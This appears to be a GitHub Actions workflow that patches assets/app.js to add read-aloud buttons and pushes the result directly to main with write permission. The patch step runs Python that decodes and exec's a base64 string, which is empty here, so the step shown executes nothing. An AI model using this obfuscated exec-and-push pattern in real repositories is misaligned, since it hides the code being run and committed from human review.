name: Add read buttons
on:
  push:
    branches: [main]
    paths:
      - '.github/workflows/add-read-buttons.yml'
permissions:
  contents: write
jobs:
  patch:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: main
      - name: Patch read aloud feature
        run: python -c "import base64;exec(base64.b64decode(''))"
      - name: Commit
        run: |
          git config user.name github-actions
          git config user.email github-actions@github.com
          git add assets/app.js
          git diff --cached --quiet && exit 0
          git commit -m "Add read aloud buttons to role and home pages"
          git push origin main
